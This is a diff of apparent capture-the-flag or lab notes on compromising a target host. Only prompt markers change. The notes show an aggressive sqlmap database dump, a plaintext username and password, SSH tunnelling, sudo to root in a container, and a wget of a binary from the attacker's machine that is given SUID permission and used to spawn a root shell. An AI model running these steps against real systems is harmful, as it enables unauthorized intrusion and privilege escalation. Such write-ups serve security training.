@@ -9,7 +9,7 @@ Ports:
 Nothing interesting found searching directoris, higest ports.
 try use sqlmap 
 
->sqlmap -u http://10.10.11.217/ --dump-all --level 5 --risk 3 --batch
+: sqlmap -u http://10.10.11.217/ --dump-all --level 5 --risk 3 --batch
 	[02:59:05] [INFO] testing connection to the target URL
 	you have not declared cookie(s), while server wants to set it sown('id=5f9d79710af...8d71d695f5').
 
@@ -88,7 +88,7 @@ read log found credentials
 
 dylan:Labr4d0rs4L1f3
 
-> ss -ltp
+: ss -ltp
 tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN      -                   
 tcp        0      0 localhost:44269         0.0.0.0:*               LISTEN      -                   
 tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      -                   
@@ -98,7 +98,7 @@ tcp6       0      0 [::]:http               [::]:*                  LISTEN      
 tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      -
 
 tunneling: 
->ssh -L 3000:127.0.0.1:3000 dylan@{ip}
+: ssh -L 3000:127.0.0.1:3000 dylan@{ip}
 
 login page with 2FA
 
@@ -123,10 +123,11 @@ edit README.md and commit changes to gain shell
 
 # in container
 
->sudo -l
-	(ALL) NOPASSWORD: ALL
+: sudo -l
 
->sudo su root
+(ALL) NOPASSWORD: ALL
+
+: sudo su root
 
 access /data this directory exist in main system
 
@@ -142,6 +143,6 @@ in container ##
 wget http://{kali}/find
 chmod 4755 find  		## suid permission
 
-dylan@machine$> ./find . -exec /bin/sh -p\; -quit
+dylan@machine: ./find . -exec /bin/sh -p\; -quit
 
 root#>
